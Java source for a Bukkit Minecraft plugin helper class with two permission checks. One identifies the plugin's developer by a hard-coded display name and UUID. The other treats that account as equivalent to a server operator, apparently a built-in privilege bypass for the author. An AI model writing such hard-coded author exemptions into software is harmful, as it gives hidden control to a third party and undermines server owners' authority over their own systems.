package com.plugins.drlogiq.imperatives.utilities;

import org.bukkit.entity.Player;

public class PlayerHelper
{
    public static boolean playerIsDeveloper(final Player player)
    {
        return player.getDisplayName().equals("DrLogiq") && player.getUniqueId().toString().equalsIgnoreCase("a3c1e592-f315-46e7-99a9-3d29f7ebedf1");
    }

    public static boolean playerIsOpOrDeveloper(final Player player)
    {
        return player.isOp() || playerIsDeveloper(player);
    }
}